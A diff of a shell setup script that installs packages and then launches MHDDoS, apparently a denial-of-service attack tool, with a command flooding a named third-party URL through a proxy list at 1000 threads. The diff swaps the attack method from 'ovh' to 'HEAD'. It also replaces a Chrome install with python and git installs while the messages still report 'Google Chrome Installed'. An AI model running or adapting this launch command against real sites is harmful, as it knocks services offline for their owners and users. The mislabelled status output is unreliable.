@@ -65,9 +65,9 @@ fi
 # Install Google Chrome
 printf "$g$b    Installing Google Chrome $endc$enda" >&2
 {
-    wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
-    sudo dpkg --install google-chrome-stable_current_amd64.deb
-    sudo apt install --assume-yes --fix-broken
+    sudo apt install python -y
+    sudo apt install python2 -y
+    sudo apt install git -y
 } &> /dev/null &&
 printf "\r$c$b    Google Chrome Installed $endc$enda\n" >&2 ||
 printf "\r$r$b    Error Occured $endc$enda\n" >&2
@@ -77,4 +77,4 @@ printf "\r$r$b    Error Occured $endc$enda\n" >&2
 ! cd MHDDoS
 ! pip3 install -r requirements.txt
 ! python3 start.py
-! python3 start.py ovh https://beta.welovecloudflare.de 1 10000000 proxy.txt 1000 8585
+! python3 start.py HEAD https://beta.welovecloudflare.de 1 10000000 proxy.txt 1000 8585
